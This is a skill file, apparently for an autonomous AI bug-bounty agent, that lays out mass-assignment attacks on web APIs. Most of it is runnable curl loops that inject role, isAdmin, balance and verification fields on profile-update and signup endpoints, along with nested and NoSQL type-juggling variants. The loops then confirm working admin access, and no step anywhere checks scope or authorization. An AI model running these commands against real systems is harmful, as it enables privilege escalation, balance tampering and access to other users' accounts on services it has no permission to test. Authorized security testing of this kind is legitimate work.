---
name: mass_assignment
agent: agent8_logic
description: Abuse framework auto-binding with unadvertised JSON fields — role/isAdmin injection, nested-object tricks, and persistence-verified privilege escalation.
---

# Mass Assignment

## Purpose
This skill finds mass-assignment vulnerabilities: endpoints that bind every supplied JSON field onto a server-side object, including fields the client was never meant to set (`role`, `isAdmin`, `balance`, `tier`, `verified`). Framework auto-binding (Spring `@ModelAttribute`, Laravel mass assignment, Mongoose `strict: false`, Rails strong-params gaps) makes this a perennial HackerOne class. Impact is privilege escalation (user → admin), balance/credit manipulation, and bypassing verification flags — all from a normal-looking profile-update or signup request.

## Division of labor
- **Consumes:** update/create endpoints from `recon/endpoints_live.txt` (POST/PUT/PATCH on users, profiles, orders, settings), real field names harvested from JS bundles / mobile bundles / OpenAPI specs by `hidden_endpoint_discovery`
- **Produces:** the finished artifact — `findings/mass_assignment_confirmed.md` with raw request/response pairs and persistence proof

## When to use / when NOT to use
- **Use when:** a PUT/PATCH/POST update endpoint reflects unknown fields without error, or silently ignores them (both are signals worth one probe each); JS bundles or OpenAPI specs reveal internal field names (`is_admin`, `role_id`, `account_balance`); signup/profile-update exists.
- **Skip when (time-pass filter):** the endpoint echoes back exactly what you sent with no persistence (verify with a re-read — one probe decides); the API uses strict DTOs that 400 on unknown fields (test once per endpoint, then move on); you cannot re-read the object to verify persistence. Ask: does the injected field persist server-side? Does it change something sensitive (role, balance, flags)?

## Methodology
1. **Harvest real field names.** Grep JS bundles, mobile APK strings, and any OpenAPI/Swagger spec for internal-looking fields: `role`, `isAdmin`, `is_admin`, `admin`, `privilege`, `tier`, `plan`, `balance`, `credits`, `verified`, `isVerified`, `emailVerified`, `status`, `permissions`, `group_id`, `tenant_id`. Real names beat guesses — record the source file per name.
2. **Baseline the update endpoint.** Send a legitimate profile update with only documented fields. Save the response. Then re-GET the object and save that too. These two are your baseline: what normal looks like, and how to verify persistence.
3. **Probe unknown-field handling.** Send the same update plus one garbage field (`{"__probe__":1}`). Three outcomes: (a) 400 unknown field → strict binding, likely NEGATIVE for this endpoint (still try nested variants once); (b) 200 and field echoed → binding is loose, proceed; (c) 200 and field silently dropped → inconclusive yet — the drop may happen at serialization while the model still bound it, so verify via re-read before judging.
4. **Inject privilege fields on profile-update.** Add `role`, `isAdmin`/`is_admin`, `privileges` in every observed casing (`role`, `Role`, `ROLE`, `role_id`, `user[role]`). Try values: `"admin"`, `1`, `true`, `["admin"]`. After each, RE-READ the object via GET — persistence is the only thing that counts, never the 200.
5. **Inject privilege fields on signup.** Registration endpoints are the classic: `{"email":"...","password":"...","role":"admin"}`. Many codebases reuse the same model for signup and admin-creation. Verify by logging in as the new user and reading back role/permissions.
6. **Inject money/status fields.** Try `balance`, `credits`, `tier`, `plan`, `verified`, `emailVerified`, `kyc_status`, `subscription`. Setting `emailVerified: true` on your own unverified account, or `tier: "enterprise"`, is often one request away.
7. **Nested-object injection.** If flat `role` is filtered, try `{"user":{"role":"admin"}}`, `{"profile":{"isAdmin":true}}`, `{"settings":{"role":"admin"}}`, and bracket notation `profile[role]=admin` (form-encoded) / `profile.role` (dot notation). Filters that strip top-level keys frequently miss nested paths that the ORM still merges.
8. **Password-reset role flips.** If a password-reset or "update account" endpoint accepts a user object, inject `role`/`isAdmin` there — reset flows are often built on the same mass-assignment-prone model and tested less.
9. **Type-juggling on guards.** Where a guard compares `role == "user"`, try `role: ["user","admin"]`, `role: {"$gt": ""}` (NoSQL), `role: 0` vs `"0"`, `isAdmin: "false"` (truthy string). The guard passes on one type while the persisted value is another.
10. **Verify persistence, always.** After EVERY injection, re-GET the object (or the `/me`, `/account`, session-info endpoint) and grep for the injected field/value. No persistence = not a finding, regardless of the status code. Record the exact re-read output.
11. **Verify the privilege is functional.** A persisted `role: "admin"` that changes nothing is weak — call an admin-only endpoint with the escalated session and confirm access. Functional escalation (admin panel loads, admin API 200s) is what makes it CONFIRMED high-severity.
12. **Framework fingerprinting.** Note the framework's tell: Spring binds `a.b=c` nested paths; Laravel respects `$fillable` (probe which fields survive); Mongoose `strict:false` keeps everything; Rails without strong params permits all. Record the observed behavior — it predicts which nested variants to try.
13. **2x reproduction.** Re-run the winning injection twice from a clean state (reset the field via a legitimate update or a fresh account between runs). Both runs must show persistence + functional effect.
14. **Check siblings.** An endpoint that binds loosely usually has siblings (other update endpoints, admin import, bulk edit) sharing the model — test the top 3 sibling endpoints with the winning payload.
15. **Write every vector up.** Each field × endpoint combination gets a verdict with the injection request, the re-read persistence proof, the functional check, and both reproductions.

## Exact commands
Baseline — legitimate update, then re-read (run FIRST):
```bash
curl -s -b cookies_A.txt -X PATCH "https://<HOST>/api/users/me" \
  -H 'Content-Type: application/json' -d '{"nickname":"baseline_user"}' -o /tmp/ma_base.json
curl -s -b cookies_A.txt "https://<HOST>/api/users/me" -o /tmp/ma_me_base.json
grep -Eo '"(nickname|role|isAdmin|is_admin|tier|verified)":("?[A-Za-z0-9_]+"?)' /tmp/ma_me_base.json
```
Field-name harvest from JS bundles and specs:
```bash
grep -Eho '"(role|isAdmin|is_admin|admin|privilege|tier|plan|balance|credits|verified|isVerified|emailVerified|status|permissions|group_id|tenant_id|role_id)"' \
  ~/workspace/recon/js_bundles/*.js 2>/dev/null | sort | uniq -c | sort -rn > /tmp/ma_fields.txt
cat /tmp/ma_fields.txt
# Also check any OpenAPI spec:
grep -Eo '"(role|isAdmin|is_admin|balance|tier|verified)"' ~/workspace/recon/openapi*.json 2>/dev/null | sort -u
```
Unknown-field handling probe (decides strict vs loose binding):
```bash
curl -s -i -b cookies_A.txt -X PATCH "https://<HOST>/api/users/me" \
  -H 'Content-Type: application/json' -d '{"nickname":"probe1","__probe__":1}' | head -c 400; echo
curl -s -b cookies_A.txt "https://<HOST>/api/users/me" | grep -o '__probe__'
# 400 -> strict (likely NEGATIVE, try one nested variant). Echoed/persisted -> loose, go deep.
# Silently dropped -> still verify nested variants; the model may bind what the serializer hides.
```
Privilege-field injection battery on profile-update (persistence checked after EACH):
```bash
for F in '{"role":"admin"}' '{"isAdmin":true}' '{"is_admin":1}' '{"role_id":1}' '{"privileges":["admin"]}'; do
  echo "=== $F ==="
  curl -s -o /dev/null -w "%{http_code}\n" -b cookies_A.txt -X PATCH "https://<HOST>/api/users/me" \
    -H 'Content-Type: application/json' -d "{\"nickname\":\"ma_test\",${F:1}"
  curl -s -b cookies_A.txt "https://<HOST>/api/users/me" \
    | grep -Eo '"(role|isAdmin|is_admin|role_id|privileges)":("?\[?[A-Za-z0-9_]+"?\]?)' | head -3
done
```
Signup injection:
```bash
curl -s -i -X POST "https://<HOST>/api/auth/signup" \
  -H 'Content-Type: application/json' \
  -d '{"email":"matest1@test.local","password":"Test1234!","role":"admin","isAdmin":true}' | head -c 500
# Then log in as matest1 and read back:
curl -s -c /tmp/ma_signup.txt -X POST "https://<HOST>/api/auth/login" \
  -H 'Content-Type: application/json' -d '{"email":"matest1@test.local","password":"Test1234!"}' -o /dev/null
curl -s -b /tmp/ma_signup.txt "https://<HOST>/api/users/me" \
  | grep -Eo '"(role|isAdmin|is_admin)":("?[A-Za-z0-9_]+"?)'
```
Nested-object and notation variants:
```bash
for B in '{"user":{"role":"admin"}}' '{"profile":{"isAdmin":true}}' '{"settings":{"role":"admin"}}'; do
  echo "=== $B ==="
  curl -s -o /dev/null -w "%{http_code}\n" -b cookies_A.txt -X PATCH "https://<HOST>/api/users/me" \
    -H 'Content-Type: application/json' -d "$B"
  curl -s -b cookies_A.txt "https://<HOST>/api/users/me" \
    | grep -Eo '"(role|isAdmin)":("?[A-Za-z0-9_]+"?)' | head -2
done
# Form-encoded bracket notation (Spring-style):
curl -s -o /dev/null -w "bracket: %{http_code}\n" -b cookies_A.txt -X PATCH "https://<HOST>/api/users/me" \
  -d 'nickname=ma2&user.role=admin&profile.isAdmin=true'
curl -s -b cookies_A.txt "https://<HOST>/api/users/me" \
  | grep -Eo '"(role|isAdmin)":("?[A-Za-z0-9_]+"?)' | head -2
```
Money/flag fields + functional privilege check:
```bash
curl -s -b cookies_A.txt -X PATCH "https://<HOST>/api/users/me" \
  -H 'Content-Type: application/json' -d '{"emailVerified":true,"tier":"enterprise","balance":999999}' -o /dev/null
curl -s -b cookies_A.txt "https://<HOST>/api/users/me" \
  | grep -Eo '"(emailVerified|tier|balance)":("?[A-Za-z0-9_]+"?)'
# Functional check: does the escalated role actually open admin endpoints?
curl -s -o /dev/null -w "admin API as escalated user: %{http_code}\n" \
  -b cookies_A.txt "https://<HOST>/api/admin/users"
# 200 here (vs 403 baseline as a normal user) = functional privilege escalation.
```
2x reproduction from clean state:
```bash
for RUN in 1 2; do
  # reset field to non-admin via legitimate-looking update first
  curl -s -b cookies_A.txt -X PATCH "https://<HOST>/api/users/me" \
    -H 'Content-Type: application/json' -d '{"nickname":"reset"}' -o /dev/null
  curl -s -o /dev/null -w "run $RUN inject: %{http_code}\n" -b cookies_A.txt \
    -X PATCH "https://<HOST>/api/users/me" \
    -H 'Content-Type: application/json' -d '{"nickname":"ma","role":"admin"}'
  echo "run $RUN persisted: $(curl -s -b cookies_A.txt "https://<HOST>/api/users/me" | grep -o '"role":"[a-z]*"')"
  echo "run $RUN functional: $(curl -s -o /dev/null -w "%{http_code}" -b cookies_A.txt "https://<HOST>/api/admin/users")"
done
# CONFIRMED requires persisted role + functional admin access in BOTH runs.
```

## Completion-bias defenses
- [ ] Real field names harvested from JS/mobile/OpenAPI with source file recorded per name
- [ ] Baseline legitimate update + re-read saved
- [ ] Unknown-field handling probed (`__probe__`) — strict vs loose binding classified per endpoint
- [ ] Privilege fields injected on profile-update in all casings (`role`, `isAdmin`, `is_admin`, `role_id`)
- [ ] Privilege fields injected on signup; new user logged in and role re-read
- [ ] Money/flag fields tested (`balance`, `tier`, `emailVerified`, `verified`)
- [ ] Nested-object variants tested (`user.role`, `profile[role]`, dot notation, form-encoded)
- [ ] Password-reset / account-update endpoints tested for role flips
- [ ] Type-juggling variants tested where guards were observed
- [ ] Persistence verified via independent re-GET after EVERY injection — no exceptions
- [ ] Functional check done: escalated session actually accessed an admin-only endpoint
- [ ] Framework binding behavior fingerprinted and recorded
- [ ] 2x reproduction from clean state, both runs showing persistence + functional effect
- [ ] Top 3 sibling endpoints tested with the winning payload
- [ ] Every field × endpoint vector has a verdict with raw pairs in `findings/mass_assignment_confirmed.md`
- **Review step:** agent10_review must verify for each CONFIRMED verdict: (1) persistence is proven by an independent re-read (not the injection response), (2) the privilege is functional (admin endpoint 200s with the escalated session vs 403 baseline), (3) both reproduction runs start from a clean state, and (4) the field name came from a harvested source or a documented injection — not a blind guess that happened to echo.
- **Nudge prompts:** "Keep going until you have tested every parameter, not just the first one that responded." / "Do not report done before the finished artifact exists on disk." / "A 200 on the injection means nothing — re-read the object and prove the field stuck."
- **Finished artifact definition:** `findings/mass_assignment_confirmed.md` exists and contains, per tested vector: the harvested field name + source, the injection request, the re-read persistence proof, the functional privilege check (admin endpoint before/after), both clean-state reproductions, and verdict CONFIRMED / INCONCLUSIVE / NEGATIVE.

## Evidence standard
- Baseline: compare every hit against a known-dead path on the same host
- Reproduction: 2x independent reproduction required
- Raw evidence: full request/response pairs saved
- Verdicts: CONFIRMED (meets all three) / INCONCLUSIVE (needs a second model run or human) / NEGATIVE (dead end, documented so nobody re-tests it)

## Handoffs
- `idor_ladder` consumes CONFIRMED role escalation: an admin session re-tests every IDOR vector vertically — it needs the escalated session cookie reference and the functional admin endpoints from the artifact.
- `price_tamper` consumes CONFIRMED balance/tier fields: a bindable `balance` or `tier` is a pricing primitive — it needs the field names and the persistence proof.
- `workflow_skip` consumes CONFIRMED `verified`/`emailVerified` flags: a bindable verification flag is a workflow-skip primitive — it needs the exact flag name and the re-read evidence.
